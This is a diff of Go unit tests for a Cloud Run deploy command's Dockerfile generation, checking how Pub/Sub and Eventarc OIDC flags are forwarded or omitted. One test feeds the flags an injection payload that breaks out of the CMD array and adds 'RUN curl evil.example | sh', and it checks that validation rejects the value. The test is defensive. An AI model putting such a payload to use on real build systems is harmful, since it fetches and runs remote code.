@@ -348,3 +348,82 @@ func TestPrepareDockerfile_BindsAllInterfaces(t *testing.T) {
 		t.Errorf("CMD args = %q, want them to carry the server port %q", args, "8080")
 	}
 }
+
+func TestPrepareDockerfile_ForwardsTriggerOIDCFlags(t *testing.T) {
+	f := &deployCloudRunFlags{}
+	f.build.execFile = "main"
+	f.build.dockerfileBuildPath = filepath.Join(t.TempDir(), "Dockerfile")
+	f.cloudRun.pubsub = true
+	f.cloudRun.pubsubTrigger = triggerConfigFlags{
+		maxRetries: 1, maxDelay: time.Second, maxRuns: 1,
+		oidcAudience: "https://svc.run.app/api/apps/a/trigger/pubsub", oidcServiceAccounts: "push@p.iam.gserviceaccount.com",
+	}
+	f.cloudRun.eventarc = true
+	f.cloudRun.eventarcTrigger = triggerConfigFlags{
+		maxRetries: 1, maxDelay: time.Second, maxRuns: 1,
+		oidcAudience: "https://svc.run.app", oidcServiceAccounts: "a@p.iam.gserviceaccount.com,b@p.iam.gserviceaccount.com",
+	}
+
+	if err := f.prepareDockerfile(); err != nil {
+		t.Fatalf("prepareDockerfile() = %v, want no error", err)
+	}
+	content, err := os.ReadFile(f.build.dockerfileBuildPath)
+	if err != nil {
+		t.Fatalf("cannot read the generated Dockerfile: %v", err)
+	}
+	// Each pair must follow its own sublauncher keyword, since both sublaunchers
+	// accept the same flag names.
+	for _, want := range []string{
+		`"--trigger_max_concurrent_runs", "1", "-oidc_audience", "https://svc.run.app/api/apps/a/trigger/pubsub", "-oidc_service_accounts", "push@p.iam.gserviceaccount.com", "eventarc"`,
+		`"--trigger_max_concurrent_runs", "1", "-oidc_audience", "https://svc.run.app", "-oidc_service_accounts", "a@p.iam.gserviceaccount.com,b@p.iam.gserviceaccount.com"]`,
+	} {
+		if !strings.Contains(string(content), want) {
+			t.Errorf("Dockerfile CMD does not carry %s:\n%s", want, content)
+		}
+	}
+}
+
+func TestPrepareDockerfile_OmitsUnsetTriggerOIDCFlags(t *testing.T) {
+	f := &deployCloudRunFlags{}
+	f.build.execFile = "main"
+	f.build.dockerfileBuildPath = filepath.Join(t.TempDir(), "Dockerfile")
+	f.cloudRun.pubsub = true
+	f.cloudRun.eventarc = true
+
+	if err := f.prepareDockerfile(); err != nil {
+		t.Fatalf("prepareDockerfile() = %v, want no error", err)
+	}
+	content, err := os.ReadFile(f.build.dockerfileBuildPath)
+	if err != nil {
+		t.Fatalf("cannot read the generated Dockerfile: %v", err)
+	}
+	if strings.Contains(string(content), "oidc") {
+		t.Errorf("Dockerfile carries OIDC flags that were never set:\n%s", content)
+	}
+}
+
+func TestComputeFlags_RejectsUnsafeTriggerOIDCValues(t *testing.T) {
+	const payload = `x"]` + "\nRUN curl evil.example | sh\n#"
+	for _, tc := range []struct {
+		flag string
+		set  func(*deployCloudRunFlags)
+	}{
+		{"--pubsub_oidc_audience", func(f *deployCloudRunFlags) { f.cloudRun.pubsubTrigger.oidcAudience = payload }},
+		{"--pubsub_oidc_service_accounts", func(f *deployCloudRunFlags) { f.cloudRun.pubsubTrigger.oidcServiceAccounts = payload }},
+		{"--eventarc_oidc_audience", func(f *deployCloudRunFlags) { f.cloudRun.eventarcTrigger.oidcAudience = payload }},
+		{"--eventarc_oidc_service_accounts", func(f *deployCloudRunFlags) { f.cloudRun.eventarcTrigger.oidcServiceAccounts = payload }},
+	} {
+		t.Run(tc.flag, func(t *testing.T) {
+			resetFlags(t, "main.go", "http://127.0.0.1:8081")
+			tc.set(&flags)
+
+			err := flags.computeFlags()
+			if err == nil {
+				t.Fatalf("computeFlags() = nil, want an error rejecting the unsafe %s value", tc.flag)
+			}
+			if !strings.Contains(err.Error(), tc.flag) {
+				t.Errorf("computeFlags() error = %v, want it to mention %s", err, tc.flag)
+			}
+		})
+	}
+}
